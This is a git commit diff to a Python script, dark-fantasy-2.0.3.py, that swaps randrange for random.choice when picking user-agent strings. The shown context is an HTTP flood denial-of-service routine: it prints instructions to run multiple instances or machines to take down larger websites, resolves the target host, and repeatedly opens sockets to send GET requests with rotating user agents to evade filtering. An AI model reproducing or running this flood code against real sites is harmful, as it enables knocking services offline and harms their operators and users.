98706ed0d9b03a4fd61a61beae391aaba8759976
Max G <max3227@gmail.com>
2020-06-22 02:01:09 +0300

    Use random.choice instead of randrange

--- dark-fantasy-2.0.3.py
+++ dark-fantasy-2.0.3.py
@@ -5,11 +5,22 @@ import urllib.error
 import urllib.parse
 import subprocess
 import html2text
-from random import randrange
+from random import choice
 from time import *
 from string import *
 import re
 import platform
+
+
+user_agents = (
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
+)
 
 
 def dos(host):
@@ -17,21 +28,6 @@ def dos(host):
         subprocess.call('cls', shell=True)
     if operSys == "Linux":
         subprocess.call('clear', shell=True)
-    uagent = []
-    uagent.append(
-        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-    uagent.append(
-        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-    uagent.append(
-        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append(
-        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
     print("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
     print("[*]Host to attack: "+host)
     ip = socket.gethostbyname(host)
@@ -46,7 +42,6 @@ def dos(host):
         except:
             print("Unable to create Socket. Retrying.")
             continue
-        random_index = randrange(len(uagent))
         try:
             s.connect((ip, 80))
         except:
@@ -55,7 +50,7 @@ def dos(host):
         print("[*]FLOODING!")
         s.send("GET / HTTP/1.1\r\n")
         s.send("Host: "+host+"\r\n")
-        s.send("User-Agent: "+uagent[random_index]+"\r\n\r\n")
+        s.send("User-Agent: "+choice(user_agents)+"\r\n\r\n")
         s.close()
     main()
 
